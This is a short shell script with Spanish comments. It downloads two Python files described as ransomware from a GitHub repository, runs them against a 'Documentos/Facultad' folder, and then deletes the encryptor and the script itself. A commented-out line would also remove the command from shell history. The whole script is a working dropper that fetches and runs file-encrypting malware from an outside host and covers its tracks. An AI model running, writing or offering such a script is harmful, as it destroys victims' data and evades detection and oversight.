# Este archivo puede accederse desde la siguiente url: https://tinyurl.com/jkmnc7
# Mover a Directorio Objetivo
cd Documentos/Facultad

# Descargar script de ransomware
curl -O https://raw.githubusercontent.com/isoprophlex/ransomware/ransomware-without-socket/run.py
curl -O https://raw.githubusercontent.com/isoprophlex/ransomware/ransomware-without-socket/encrypt.py

# Ejecutar script de ransomware
python3 -B run.py &

# Eliminar archivo de ransomware?
sleep 4
rm encrypt.py

# Eliminar archivo de script
cd ../..
rm s.sh

# Eliminar ejecución de script del historial de comandos?
# history -d (history | tail -n 2 | head -n 1 | awk '{print $1}')
